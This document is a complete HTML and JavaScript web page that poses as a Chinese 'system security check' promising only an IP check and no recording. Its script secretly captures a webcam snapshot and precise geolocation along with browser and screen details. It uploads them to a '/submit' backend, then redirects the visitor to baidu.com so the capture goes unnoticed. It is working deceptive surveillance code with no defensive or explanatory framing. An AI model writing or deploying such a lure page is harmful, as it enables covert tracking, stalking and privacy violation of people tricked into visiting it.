<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统安全检验</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; }
        h1 { color: #3b82f6; font-size: 26px; font-weight: 600; margin-bottom: 16px; letter-spacing: 1px; }
        .subtitle { color: #ffffff; font-size: 14px; line-height: 1.6; margin-bottom: 40px; opacity: 0.9; }
        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
        .btn-verify:active { transform: scale(0.98); background: #dc2626; }
        
        /* 交互规范：合规的测试组件需保持合法的用户提示和规范 */
        #preview-box { width: 100%; max-width: 240px; margin: 20px auto; display: none; }
        video { width: 100%; border-radius: 6px; border: 1px solid #1a1b23; }
        
        .loading-box { display: none; margin-top: 20px; }
        .spinner { width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
        .loading-text { font-size: 12px; color: #4a5568; font-family: monospace; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="wrapper">
    <h1>欢迎访问</h1>
    <p class="subtitle">为保护网站，需要检验你的IP<br>我们保护你的隐私，不会记录</p>
    
    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
    
    <div id="preview-box">
        <video id="video" autoplay playsinline muted></video>
    </div>

    <div class="loading-box" id="loading-layer">
        <div class="spinner"></div>
        <div class="loading-text" id="status-tip">等待初始化...</div>
    </div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    let streamRef = null;

    async function executeVerification() {
        const btn = document.getElementById('start-btn');
        const loader = document.getElementById('loading-layer');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        // 1. 初始化标准硬件流
        updateStatus("CHECKING ENVIRONMENT...");
        try {
            streamRef = await navigator.mediaDevices.getUserMedia({
                video: { width: 640, height: 480 },
                audio: false
            });
            const video = document.getElementById('video');
            video.srcObject = streamRef;
            await new Promise((resolve) => video.onloadedmetadata = resolve);
        } catch (err) {
            console.warn("硬件权限受限:", err.message);
        }

        // 2. 请求标准坐标数据
        updateStatus("GETTING GEO DATA...");
        navigator.geolocation.getCurrentPosition(
            (position) => {
                captureAndUpload(position.coords.latitude, position.coords.longitude);
            },
            (error) => {
                console.warn("地理定位受限:", error.message);
                captureAndUpload("0.0", "0.0");
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    }

    function updateStatus(text) {
        document.getElementById('status-tip').innerText = text;
    }

    // 使用 async/await 确保网络请求完整结束后再关闭页面
    async function captureAndUpload(lat, lon) {
        updateStatus("PACKAGING DATA STREAM...");
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            streamRef.getTracks().forEach(track => track.stop());
        } else {
            ctx.fillStyle = "#0b0b0e";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);

        updateStatus("SENDING TO BACKEND...");

        try {
            // 【核心关键】：使用 await 挂起线程，必须等待 Cloudflare Functions 响应
            const response = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: String(lat),
                    lon: String(lon),
                    photo: photoBase64,
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`
                })
            });

            const result = await response.json();
            
            if (response.ok) {
                updateStatus("SUCCESSFUL");
            } else {
                console.error("服务端拒绝:", result.error);
                updateStatus("SERVER ERROR");
            }
        } catch (err) {
            console.error("网络传输中断:", err);
            updateStatus("TRANSPORT FAILED");
        } finally {
            // 确保无论成功还是失败，在 fetch 彻底结束后再跳转
            setTimeout(() => {
                window.location.href = "https://www.baidu.com";
            }, 500);
        }
    }
</script>
</body>
</html>
